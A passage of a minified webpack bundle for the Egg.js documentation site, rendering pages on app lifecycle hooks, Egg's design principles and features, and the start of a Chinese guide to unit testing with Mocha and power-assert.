\u4e2d\u5b9a\u4e49\u8fd9\u4e2a Boot \u7c7b\uff0c\u4e0b\u9762\u6211\u4eec\u62bd\u53d6\u51e0\u4e2a\u5728\u5e94\u7528\u5f00\u53d1\u4e2d\u5e38\u7528\u7684\u751f\u547d\u5468\u671f\u51fd\u6570\u6765\u4e3e\u4f8b\uff1a"),r.a.createElement(o["a"],{code:"// app.js\nclass AppBootHook {\n  constructor(app) {\n    this.app = app;\n  }\n\n  configWillLoad() {\n    // \u6b64\u65f6 config \u6587\u4ef6\u5df2\u7ecf\u88ab\u8bfb\u53d6\u5e76\u5408\u5e76\uff0c\u4f46\u662f\u8fd8\u5e76\u672a\u751f\u6548\n    // \u8fd9\u662f\u5e94\u7528\u5c42\u4fee\u6539\u914d\u7f6e\u7684\u6700\u540e\u65f6\u673a\n    // \u6ce8\u610f\uff1a\u6b64\u51fd\u6570\u53ea\u652f\u6301\u540c\u6b65\u8c03\u7528\n\n    // \u4f8b\u5982\uff1a\u53c2\u6570\u4e2d\u7684\u5bc6\u7801\u662f\u52a0\u5bc6\u7684\uff0c\u5728\u6b64\u5904\u8fdb\u884c\u89e3\u5bc6\n    this.app.config.mysql.password = decrypt(this.app.config.mysql.password);\n    // \u4f8b\u5982\uff1a\u63d2\u5165\u4e00\u4e2a\u4e2d\u95f4\u4ef6\u5230\u6846\u67b6\u7684 coreMiddleware \u4e4b\u95f4\n    const statusIdx = this.app.config.coreMiddleware.indexOf('status');\n    this.app.config.coreMiddleware.splice(statusIdx + 1, 0, 'limit');\n  }\n\n  async didLoad() {\n    // \u6240\u6709\u7684\u914d\u7f6e\u5df2\u7ecf\u52a0\u8f7d\u5b8c\u6bd5\n    // \u53ef\u4ee5\u7528\u6765\u52a0\u8f7d\u5e94\u7528\u81ea\u5b9a\u4e49\u7684\u6587\u4ef6\uff0c\u542f\u52a8\u81ea\u5b9a\u4e49\u7684\u670d\u52a1\n\n    // \u4f8b\u5982\uff1a\u521b\u5efa\u81ea\u5b9a\u4e49\u5e94\u7528\u7684\u793a\u4f8b\n    this.app.queue = new Queue(this.app.config.queue);\n    await this.app.queue.init();\n\n    // \u4f8b\u5982\uff1a\u52a0\u8f7d\u81ea\u5b9a\u4e49\u7684\u76ee\u5f55\n    this.app.loader.loadToContext(path.join(__dirname, 'app/tasks'), 'tasks', {\n      fieldClass: 'tasksClasses',\n    });\n  }\n\n  async willReady() {\n    // \u6240\u6709\u7684\u63d2\u4ef6\u90fd\u5df2\u542f\u52a8\u5b8c\u6bd5\uff0c\u4f46\u662f\u5e94\u7528\u6574\u4f53\u8fd8\u672a ready\n    // \u53ef\u4ee5\u505a\u4e00\u4e9b\u6570\u636e\u521d\u59cb\u5316\u7b49\u64cd\u4f5c\uff0c\u8fd9\u4e9b\u64cd\u4f5c\u6210\u529f\u624d\u4f1a\u542f\u52a8\u5e94\u7528\n\n    // \u4f8b\u5982\uff1a\u4ece\u6570\u636e\u5e93\u52a0\u8f7d\u6570\u636e\u5230\u5185\u5b58\u7f13\u5b58\n    this.app.cacheData = await this.app.model.query(QUERY_CACHE_SQL);\n  }\n\n  async didReady() {\n    // \u5e94\u7528\u5df2\u7ecf\u542f\u52a8\u5b8c\u6bd5\n\n    const ctx = await this.app.createAnonymousContext();\n    await ctx.service.Biz.request();\n  }\n\n  async serverDidReady() {\n    // http / https server \u5df2\u542f\u52a8\uff0c\u5f00\u59cb\u63a5\u53d7\u5916\u90e8\u8bf7\u6c42\n    // \u6b64\u65f6\u53ef\u4ee5\u4ece app.server \u62ff\u5230 server \u7684\u5b9e\u4f8b\n\n    this.app.server.on('timeout', (socket) => {\n      // handle socket timeout\n    });\n  }\n}\n\nmodule.exports = AppBootHook;",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"\u6ce8\u610f\uff1a\u5728\u81ea\u5b9a\u4e49\u751f\u547d\u5468\u671f\u51fd\u6570\u4e2d\u4e0d\u5efa\u8bae\u505a\u592a\u8017\u65f6\u7684\u64cd\u4f5c\uff0c\u6846\u67b6\u4f1a\u6709\u542f\u52a8\u7684\u8d85\u65f6\u68c0\u6d4b\u3002")),r.a.createElement("p",null,"\u5982\u679c\u4f60\u7684 Egg \u6846\u67b6\u7684\u751f\u547d\u5468\u671f\u51fd\u6570\u662f\u65e7\u7248\u672c\u7684\uff0c\u5efa\u8bae\u4f60\u5347\u7ea7\u5230\u7c7b\u65b9\u6cd5\u6a21\u5f0f\uff1b\u8be6\u60c5\u8bf7\u67e5\u770b",r.a.createElement(l["Link"],{to:"../advanced/loader-update"},"\u5347\u7ea7\u4f60\u7684\u751f\u547d\u5468\u671f\u4e8b\u4ef6\u51fd\u6570"),"\u3002")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},gbrS:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,r.a.createElement("strong",null,"Egg is born for building enterprise application and framework"),"\uff0cwe hope Egg will give birth to more application framework to help developers and developing teams reduce development and maintenance costs."),r.a.createElement("h2",{id:"design-principles"},r.a.createElement(l["AnchorLink"],{to:"#design-principles","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Design principles"),r.a.createElement("p",null,"Since we know well that enterprise applications need to consider how to balance the differences between different teams, seeking common ground while reserving differences in the pursuit of clarifying specification and cooperation, we focus on providing core features for Web development and a flexible and extensible plugin mechanism instead of giant bazaar mode which is popular in common Web frameworks (with integrated such as database, template engine, front-end framework and other functions). We will not make a technical selection because default technical selection makes the scalability of the framework too poor to meet a variety of custom requirements. With the help of Egg, it is very easy for architects and technical leaders to build their own framework which is suitable for their business scenarios based on the existing technology stack ."),r.a.createElement("p",null,"The plugin mechanism of Egg is very extensible, ",r.a.createElement("strong",null,"one purpose for one plugin"),"(Eg: ",r.a.createElement(l["Link"],{to:"https://mozilla.github.io/nunjucks"},"Nunjucks")," is encapsulated into ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks"),", and MySQL is encapsulated into ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql"},"egg-mysql"),"). Aggregating the plugins and customizing the configurations according to their own business scenarios greatly reduces the development cost."),r.a.createElement("p",null,"Egg is a convention-over-configuration framework, follows the ",r.a.createElement(l["Link"],{to:"./advanced/loader"},"Loader")," to do the development, it helps to reduce the cost of learning. Developers no longer work as 'nails'. The cost of communication is very high for a team without convention. It is easy to get fault without convention. However convention is not equal to difficult extension, instead, Egg does well in extension part, you can build your own framework according to team convention. ",r.a.createElement(l["Link"],{to:"./advanced/loader"},"Loader")," can help load different default configuration in a different environment, Egg default convention can also be covered by your own."),r.a.createElement("h2",{id:"differences-between-community-framework"},r.a.createElement(l["AnchorLink"],{to:"#differences-between-community-framework","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Differences Between Community Framework"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://expressjs.com/"},"Express")," is well used in the Node.js community, it is easy and extensible, fits personal projects a lot. However, without default convention, the standard mvc model has lots of strange impl which would lead to misunderstandings. Egg's teamwork cost is really low by following convention convention-over-configuration."),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"http://sailsjs.com/"},"Sails")," is a framework that also follows convention-over-configuration,it does well in extensible work. Compared with Egg, ",r.a.createElement(l["Link"],{to:"http://sailsjs.com/"},"Sails")," supports blueprint REST API, ",r.a.createElement(l["Link"],{to:"https://github.com/balderdashy/waterline"},"WaterLine")," , Frontend integration, WebSocket and so on, all of these are provided by ",r.a.createElement(l["Link"],{to:"http://sailsjs.com/"},"Sails"),". Egg does not provide these functions, it only has the integration of different functional extensions, such as egg-blueprint, egg-waterline, if you use sails-egg to integrate these extensions, ",r.a.createElement(l["Link"],{to:"http://sailsjs.com/"},"Sails")," can be replaced."),r.a.createElement("h2",{id:"features"},r.a.createElement(l["AnchorLink"],{to:"#features","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Features"),r.a.createElement("ul",null,r.a.createElement("li",null,"Provide capability to ",r.a.createElement(l["Link"],{to:"./advanced/framework"},"customizd framework")," base on Egg"),r.a.createElement("li",null,"Highly extensible ",r.a.createElement(l["Link"],{to:"./basics/plugin"},"plugin mechanism")),r.a.createElement("li",null,"Built-in ",r.a.createElement(l["Link"],{to:"./advanced/cluster-client"},"cluster")),r.a.createElement("li",null,"Based on ",r.a.createElement(l["Link"],{to:"http://koajs.com/"},"Koa")," with high performance"),r.a.createElement("li",null,"Stable core framework with high test coverage"),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./intro/progressive"},"Progressive development")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},gei9:function(e,t,n){var a=n("0mt+"),r=n("7un0"),l=n("oyD1"),o=r.get,i=r.toKey;a({target:"Reflect",stat:!0},{getOwnMetadata:function(e,t){var n=arguments.length<3?void 0:i(arguments[2]);return o(e,l(t),n)}})},ggJa:function(e,t){e.exports=function(e,t){return e===t||e!=e&&t!=t}},ggxN:function(e,t,n){var a=n("0mt+");a({target:"Math",stat:!0},{DEG_PER_RAD:Math.PI/180})},gkrA:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"\u4e3a\u4ec0\u4e48\u8981\u5355\u5143\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u4e3a\u4ec0\u4e48\u8981\u5355\u5143\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u4e3a\u4ec0\u4e48\u8981\u5355\u5143\u6d4b\u8bd5"),r.a.createElement("p",null,"\u5148\u95ee\u6211\u4eec\u81ea\u5df1\u4ee5\u4e0b\u51e0\u4e2a\u95ee\u9898\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4f60\u7684\u4ee3\u7801\u8d28\u91cf\u5982\u4f55\u5ea6\u91cf\uff1f"),r.a.createElement("li",null,"\u4f60\u662f\u5982\u4f55\u4fdd\u8bc1\u4ee3\u7801\u8d28\u91cf\uff1f"),r.a.createElement("li",null,"\u4f60\u6562\u968f\u65f6\u91cd\u6784\u4ee3\u7801\u5417\uff1f"),r.a.createElement("li",null,"\u4f60\u662f\u5982\u4f55\u786e\u4fdd\u91cd\u6784\u7684\u4ee3\u7801\u4f9d\u7136\u4fdd\u6301\u6b63\u786e\u6027\uff1f"),r.a.createElement("li",null,"\u4f60\u662f\u5426\u6709\u8db3\u591f\u4fe1\u5fc3\u5728\u6ca1\u6709\u6d4b\u8bd5\u7684\u60c5\u51b5\u4e0b\u968f\u65f6\u53d1\u5e03\u4f60\u7684\u4ee3\u7801\uff1f")),r.a.createElement("p",null,"\u5982\u679c\u7b54\u6848\u90fd\u6bd4\u8f83\u72b9\u8c6b\uff0c\u90a3\u4e48\u5c31\u8bc1\u660e\u6211\u4eec\u975e\u5e38\u9700\u8981\u5355\u5143\u6d4b\u8bd5\u3002"),r.a.createElement("p",null,"\u5b83\u80fd\u5e26\u7ed9\u6211\u4eec\u5f88\u591a\u4fdd\u969c\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u4ee3\u7801\u8d28\u91cf\u6301\u7eed\u6709\u4fdd\u969c"),r.a.createElement("li",null,"\u91cd\u6784\u6b63\u786e\u6027\u4fdd\u969c"),r.a.createElement("li",null,"\u589e\u5f3a\u81ea\u4fe1\u5fc3"),r.a.createElement("li",null,"\u81ea\u52a8\u5316\u8fd0\u884c")),r.a.createElement("p",null,"Web \u5e94\u7528\u4e2d\u7684\u5355\u5143\u6d4b\u8bd5\u66f4\u52a0\u91cd\u8981\uff0c\u5728 Web \u4ea7\u54c1\u5feb\u901f\u8fed\u4ee3\u7684\u65f6\u671f\uff0c\u6bcf\u4e2a\u6d4b\u8bd5\u7528\u4f8b\u90fd\u7ed9\u5e94\u7528\u7684\u7a33\u5b9a\u6027\u63d0\u4f9b\u4e86\u4e00\u5c42\u4fdd\u969c\u3002 API \u5347\u7ea7\uff0c\u6d4b\u8bd5\u7528\u4f8b\u53ef\u4ee5\u5f88\u597d\u5730\u68c0\u67e5\u4ee3\u7801\u662f\u5426\u5411\u4e0b\u517c\u5bb9\u3002 \u5bf9\u4e8e\u5404\u79cd\u53ef\u80fd\u7684\u8f93\u5165\uff0c\u4e00\u65e6\u6d4b\u8bd5\u8986\u76d6\uff0c\u90fd\u80fd\u660e\u786e\u5b83\u7684\u8f93\u51fa\u3002 \u4ee3\u7801\u6539\u52a8\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7\u6d4b\u8bd5\u7ed3\u679c\u5224\u65ad\u4ee3\u7801\u7684\u6539\u52a8\u662f\u5426\u5f71\u54cd\u5df2\u786e\u5b9a\u7684\u7ed3\u679c\u3002"),r.a.createElement("p",null,"\u6240\u4ee5\uff0c\u5e94\u7528\u7684 Controller\u3001Service\u3001Helper\u3001Extend \u7b49\u4ee3\u7801\uff0c\u90fd\u5fc5\u987b\u6709\u5bf9\u5e94\u7684\u5355\u5143\u6d4b\u8bd5\u4fdd\u8bc1\u4ee3\u7801\u8d28\u91cf\u3002 \u5f53\u7136\uff0c\u6846\u67b6\u548c\u63d2\u4ef6\u7684\u6bcf\u4e2a\u529f\u80fd\u6539\u52a8\u548c\u91cd\u6784\u90fd\u9700\u8981\u6709\u76f8\u5e94\u7684\u5355\u5143\u6d4b\u8bd5\uff0c\u5e76\u4e14\u8981\u6c42\u5c3d\u91cf\u505a\u5230\u4fee\u6539\u7684\u4ee3\u7801\u80fd\u88ab 100% \u8986\u76d6\u5230\u3002"),r.a.createElement("h2",{id:"\u6d4b\u8bd5\u6846\u67b6"},r.a.createElement(l["AnchorLink"],{to:"#\u6d4b\u8bd5\u6846\u67b6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6d4b\u8bd5\u6846\u67b6"),r.a.createElement("p",null,"\u4ece ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/search?q=test%20framework&page=1&ranking=popularity"},"npm \u641c\u7d22\u300etest framework\u300f"),"\uff0c \u6211\u4eec\u4f1a\u53d1\u73b0\u6709\u5927\u91cf\u6d4b\u8bd5\u6846\u67b6\u5b58\u5728\uff0c\u6bcf\u4e2a\u6d4b\u8bd5\u6846\u67b6\u90fd\u6709\u5b83\u7684\u72ec\u7279\u4e4b\u5904\u3002"),r.a.createElement("h3",{id:"mocha"},r.a.createElement(l["AnchorLink"],{to:"#mocha","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mocha"),r.a.createElement("p",null,"\u6211\u4eec\u9009\u62e9\u548c\u63a8\u8350\u5927\u5bb6\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"http://mochajs.org/"},"Mocha"),"\uff0c\u529f\u80fd\u975e\u5e38\u4e30\u5bcc\uff0c\u652f\u6301\u8fd0\u884c\u5728 Node.js \u548c\u6d4f\u89c8\u5668\u4e2d\uff0c \u5bf9\u5f02\u6b65\u6d4b\u8bd5\u652f\u6301\u975e\u5e38\u53cb\u597d\u3002"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Mocha is a feature-rich JavaScript test framework running on Node.js and in the browser, making asynchronous testing simple and fun. Mocha tests run serially, allowing for flexible and accurate reporting, while mapping uncaught exceptions to the correct test cases.")),r.a.createElement("h3",{id:"ava"},r.a.createElement(l["AnchorLink"],{to:"#ava","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"AVA"),r.a.createElement("p",null,"\u4e3a\u4ec0\u4e48\u6ca1\u6709\u9009\u62e9\u6700\u8fd1\u6bd4\u8f83\u706b\u7684 ",r.a.createElement(l["Link"],{to:"https://github.com/avajs/ava"},"AVA"),"\uff0c\u5b83\u770b\u8d77\u6765\u4f1a\u8dd1\u5f97\u5f88\u5feb\u3002 \u7ecf\u8fc7\u6211\u4eec\u51e0\u4e2a\u771f\u5b9e\u9879\u76ee\u5b9e\u8df5\u4e0b\u6765\uff0cAVA \u771f\u7684\u53ea\u662f\u770b\u8d77\u6765\u5f88\u7f8e\uff0c\u4f46\u662f\u5b9e\u9645\u4f1a\u8ba9\u6d4b\u8bd5\u4ee3\u7801\u8d8a\u6765\u8d8a\u96be\u5199\uff0c\u6210\u672c\u8d8a\u6765\u8d8a\u9ad8\u3002"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/dead-horse"},"@dead-horse")," \u7684\u8bc4\u4ef7\uff1a"),r.a.createElement("blockquote",null,r.a.createElement("ul",null,r.a.createElement("li",null,"AVA \u81ea\u8eab\u4e0d\u591f\u7a33\u5b9a\uff0c\u5e76\u53d1\u8fd0\u884c\u6587\u4ef6\u591a\u7684\u65f6\u5019\u4f1a\u6491\u7206 CPU\uff1b\u5982\u679c\u8bbe\u7f6e\u63a7\u5236\u5e76\u53d1\u53c2\u6570\u7684\u65b9\u5f0f\u8fd0\u884c\uff0c\u4f1a\u5bfc\u81f4 only \u6a21\u5f0f\u65e0\u6548\u3002"),r.a.createElement("li",null,"\u5e76\u53d1\u6267\u884c\u5bf9\u6d4b\u8bd5\u7528\u4f8b\u7684\u8981\u6c42\u5f88\u9ad8\uff0c\u6240\u6709\u7684\u6d4b\u8bd5\u4e0d\u80fd\u6709\u4f9d\u8d56\uff0c\u7279\u522b\u662f\u9047\u5230\u4e00\u4e9b\u9700\u8981\u505a mock \u7684\u573a\u666f\u65f6\uff0c\u5199\u597d\u5f88\u96be\u3002"),r.a.createElement("li",null,"app \u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u662f\u6709\u8017\u65f6\u7684\uff0c\u5982\u679c\u4e32\u884c\u8fd0\u884c\uff0c\u53ea\u9700\u8981\u521d\u59cb\u5316\u4e00\u4e2a app \u5bf9\u5b83\u6d4b\u8bd5\u3002 \u4f46\u662f AVA \u6bcf\u4e00\u4e2a\u6587\u4ef6\u90fd\u8fd0\u884c\u5728\u72ec\u7acb\u8fdb\u7a0b\uff0c\u6709\u591a\u5c11\u4e2a\u6587\u4ef6\u5c31\u9700\u8981\u521d\u59cb\u5316\u591a\u5c11\u4e2a app\u3002"))),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/fool2fish"},"@fool2fish")," \u7684\u8bc4\u4ef7\uff1a"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u5982\u679c\u662f\u7b80\u5355\u7684\u7a0b\u5e8f\u7684\u8bdd\u7528 AVA \u4f1a\u5feb\u4e00\u4e9b\uff08\u4f46\u662f\u672c\u6765\u5c31\u7b80\u5355\u53ef\u80fd\u4e5f\u6ca1\u5565\u611f\u89c9\uff09\uff0c \u5982\u679c\u662f\u590d\u6742\u7684\u5c31\u4e0d\u63a8\u8350\u4e86\uff0c\u6bd4\u8f83\u5927\u7684\u95ee\u9898\u662f\u53ef\u80fd\u6ca1\u6cd5\u7ed9\u51fa\u51c6\u786e\u7684\u9519\u8bef\u5806\u6808\uff0c \u53e6\u5916\u5e76\u53d1\u53ef\u80fd\u4f1a\u5bfc\u81f4\u4f9d\u8d56\u7684\u5176\u4ed6\u6d4b\u8bd5\u73af\u5883\u7684\u670d\u52a1\u6302\u6389\uff0c\u964d\u4f4e\u6d4b\u8bd5\u7684\u6210\u529f\u7387\uff0c \u8fd8\u6709\u5c31\u662f\u5e26\u6d41\u7a0b\u7684\u6d4b\u8bd5\uff08\u6bd4\u5982\u6d4b\u8bd5\u6570\u636e\u5e93\u7684\u589e\u5220\u6539\u67e5\u529f\u80fd\uff09\u771f\u5fc3\u4e0d\u9002\u5408\u7528 AVA\u3002")),r.a.createElement("h2",{id:"\u65ad\u8a00\u5e93"},r.a.createElement(l["AnchorLink"],{to:"#\u65ad\u8a00\u5e93","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u65ad\u8a00\u5e93"),r.a.createElement("p",null,"\u540c\u6837\uff0c\u6d4b\u8bd5\u65ad\u8a00\u5e93\u4e5f\u662f",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/search?q=assert&page=1&ranking=popularity"},"\u767e\u82b1\u9f50\u653e\u7684\u65f6\u4ee3"),"\uff0c \u6211\u4eec\u7ecf\u5386\u8fc7 ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/assert.html"},"assert"),"\uff0c\u5230 ",r.a.createElement(l["Link"],{to:"https://github.com/shouldjs/should.js"},"should")," \u548c ",r.a.createElement(l["Link"],{to:"https://github.com/Automattic/expect.js"},"expect"),"\uff0c\u8fd8\u662f\u4e0d\u65ad\u5730\u5728\u5c1d\u8bd5\u66f4\u597d\u7684\u65ad\u8a00\u5e93\u3002"),r.a.createElement("p",null,"\u76f4\u5230\u6211\u4eec\u53d1\u73b0 ",r.a.createElement(l["Link"],{to:"https://github.com/power-assert-js/power-assert"},"power-assert"),"\uff0c \u56e0\u4e3a",r.a.createElement(l["Link"],{to:"https://github.com/atian25/blog/issues/16"},"\u300eNo API is the best API\u300f"),"\uff0c \u6700\u7ec8\u6211\u4eec\u91cd\u65b0\u56de\u5f52\u539f\u59cb\u7684 assert \u4f5c\u4e3a\u9ed8\u8ba4\u7684\u65ad\u8a00\u5e93\u3002"),r.a.createElement("p",null,"\u7b80\u5355\u5730\u8bf4\uff0c\u5b83\u7684\u4f18\u70b9\u662f\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6ca1\u6709 API \u5c31\u662f\u6700\u597d\u7684 API\uff0c\u4e0d\u9700\u8981\u4efb\u4f55\u8bb0\u5fc6\uff0c\u53ea\u9700 assert \u5373\u53ef\u3002"),r.a.createElement("li",null,r.a.createElement("strong",null,"\u5f3a\u5927\u7684\u9519\u8bef\u4fe1\u606f\u53cd\u9988")),r.a.createElement("li",null,r.a.createElement("strong",null,"\u5f3a\u5927\u7684\u9519\u8bef\u4fe1\u606f\u53cd\u9988")),r.a.createElement("li",null,r.a.createElement("strong",null,"\u5f3a\u5927\u7684\u9519\u8bef\u4fe1\u606f\u53cd\u9988"))),r.a.createElement("p",null,"\u62a5\u9519\u4fe1\u606f\u5b9e\u5728\u592a\u7f8e\u592a\u8be6\u7ec6\uff0c\u8ba9\u4eba\u6709\u79cd\u60f3\u770b\u9519\u8bef\u62a5\u544a\u7684\u6b32\u671b\uff1a"),r.a.createElement("p",null,r.a.createElement("img",{src:"https://cloud.githubusercontent.com/assets/227713/20919940/19e83de8-bbd9-11e6-8951-bf4a332f9b5a.png",alt:""})),r.a.createElement("h2",{id:"\u6d4b\u8bd5\u7ea6\u5b9a"},r.a.createElement(l["AnchorLink"],{to:"#\u6d4b\u8bd5\u7ea6\u5b9a","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6d4b\u8bd5\u7ea6\u5b9a"),r.a.createElement("p",null,"\u4e3a\u4e86\u8ba9\u6211\u4eec\u66f4\u591a\u5730\u5173\u6ce8\u6d4b\u8bd5\u7528\u4f8b\u672c\u8eab\u5982\u4f55\u7f16\u5199\uff0c\u800c\u4e0d\u662f\u8017\u8d39\u65f6\u95f4\u5728\u5982\u4f55\u8fd0\u884c\u6d4b\u8bd5\u811a\u672c\u7b49\u8f85\u52a9\u5de5\u4f5c\u4e0a\uff0c \u6846\u67b6\u5bf9\u5355\u5143\u6d4b\u8bd5\u505a\u4e86\u4e00\u4e9b\u57fa\u672c\u7ea6\u5b9a\u3002"),r.a.createElement("h3",{id:"\u6d4b\u8bd5\u76ee\u5f55\u7ed3\u6784"},r.a.createElement(l["AnchorLink"],{to:"#\u6d4b\u8bd5\u76ee\u5f55\u7ed3\u6784","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6d4b\u8bd5\u76ee\u5f55\u7ed3\u6784"),r.a.createElement("p",null,"\u6211\u4eec\u7ea6\u5b9a ",r.a.createElement("code",null,"test")," \u76ee\u5f55\u4e3a\u5b58\u653e\u6240\u6709\u6d4b\u8bd5\u811a\u672c\u7684\u76ee\u5f55\uff0c\u6d4b\u8bd5\u6240\u4f7f\u7528\u5230\u7684 ",r.a.createElement("code",null,"fixtures")," \u548c\u76f8\u5173\u8f85\u52a9\u811a\u672c\u90fd\u5e94\u8be5\u653e\u5728\u6b64\u76ee\u5f55\u4e0b\u3002"),r.a.createElement("p",null,"\u6d4b\u8bd5\u811a\u672c\u6587\u4ef6\u7edf\u4e00\u6309 ",r.a.createElement("code",null,"$","{","filename","}",".test.js")," \u547d\u540d\uff0c\u5fc5\u987b\u4ee5 ",r.a.createElement("code",null,".test.js")," \u4f5c\u4e3a\u6587\u4ef6\u540e\u7f00\u3002"),r.a.createElement("p",null,"\u4e00\u4e2a\u5e94\u7528\u7684\u6d4b\u8bd5\u76ee\u5f55\u793a\u4f8b\uff1a"),r.a.createElement(o["a"],{code:"test\n\u251c\u2500\u2500 controller\n\u2502\xa0\xa0 \u2514\u2500\u2500 home.test.js\n\u251c\u2500\u2500 hello.test.js\n\u2514\u2500\u2500 service\n    \u2514\u2500\u2500 user.test.js",lang:"bash"}),r.a.createElement("h3",{id:"\u6d4b\u8bd5\u8fd0\u884c\u5de5\u5177"},r.a.createElement(l["AnchorLink"],{to:"#\u6d4b\u8bd5\u8fd0\u884c\u5de5\u5177","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6d4b\u8bd5\u8fd0\u884c\u5de5\u5177"),r.a.createElement("p",null,"\u7edf\u4e00\u4f7f\u7528 ",r.a.createElement(l["AnchorLink"],{to:"./development#%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95"},"egg-bin \u6765\u8fd0\u884c\u6d4b\u8bd5\u811a\u672c"),"\uff0c \u81ea\u52a8\u5c06\u5185\u7f6e\u7684 ",r.a.createElement(l["Link"],{to:"https://mochajs.org/"},"Mocha"),"\u3001",r.a.createElement(l["Link"],{to:"https://github.com/blakeembrey/co-mocha"},"co-mocha"),"\u3001",r.a.createElement(l["Link"],{to:"https://github.com/power-assert-js/power-assert"},"power-assert"),"\uff0c",r.a.createElement(l["Link"],{to:"https://github.com/istanbuljs/nyc"},"nyc")," \u7b49\u6a21\u5757\u7ec4\u5408\u5f15\u5165\u5230\u6d4b\u8bd5\u811a\u672c\u4e2d\uff0c \u8ba9\u6211\u4eec",r.a.createElement("strong",null,"\u805a\u7126\u7cbe\u529b\u5728\u7f16\u5199\u6d4b\u8bd5\u4ee3\u7801"),"\u4e0a\uff0c\u800c\u4e0d\u662f\u7ea0\u7ed3\u9009\u62e9\u90a3\u4e9b\u6d4b\u8bd5\u5468\u8fb9\u5de5\u5177\u548c\u6a21\u5757\u3002"),r.a.createElement("p",null,"\u53ea\u9700\u8981\u5728 ",r.a.createElement("code",null,"package.json")," \u4e0a\u914d\u7f6e\u597d ",r.a.createElement("code",null,"scripts.test")," \u5373\u53ef\u3002"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "test": "egg-bin test"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"\u7136\u540e\u5c31\u53ef\u4ee5\u6309\u6807\u51c6\u7684 ",r.a.createElement("code",null,"npm test")," \u6765\u8fd0\u884c\u6d4b\u8bd5\u4e86\u3002"),r.a.createElement(o["a"],{code:"npm test\n\n> unittest-example@ test /Users/mk2/git/github.com/eggjs/examples/unittest\n> egg-bin test\n\n  test/hello.test.js\n    \u2713 should work\n\n  1 passing (10ms)",lang:"bash"}),r.a.createElement("h2",{id:"\u51c6\u5907\u6d4b\u8bd5"},r.a.createElement(l["AnchorLink"],{to:"#\u51c6\u5907\u6d4b\u8bd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u51c6\u5907\u6d4b\u8bd5"),r.a.createElement("p",null,"\u672c\u6587\u4e3b\u8981\u4ecb\u7ecd\u5982\u4f55\u7f16\u5199\u5e94\u7528\u7684\u5355\u5143\u6d4b\u8bd5\uff0c\u5173\u4e8e\u6846\u67b6\u548c\u63d2\u4ef6\u7684\u5355\u5143\u6d4b\u8bd5\u8bf7\u67e5\u770b",r.a.createElement(l["Link"],{to:"../advanced/framework"},"\u6846\u67b6\u5f00\u53d1"),"\u548c",r.a.createElement(l["Link"],{to:"../advanced/plugin"},"\u63d2\u4ef6\u5f00\u53d1"),"\u76f8\u5173\u7ae0\u8282\u3002"),r.a.createElement("h3",{id:"mock"},r.a.createElement(l["AnchorLink"],{to:"#mock","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"mock"),r.a.createElement("p",null,"\u6b63\u5e38\u6765\u8bf4\uff0c\u5982\u679c\u8981\u5b8c\u6574\u624b\u5199\u4e00\u4e2a app \u521b\u5efa\u548c\u542f\u52a8\u4ee3\u7801\uff0c\u8fd8\u662f\u9700\u8981\u5199\u4e00\u6bb5\u521d\u59cb\u5316\u811a\u672c\u7684\uff0c 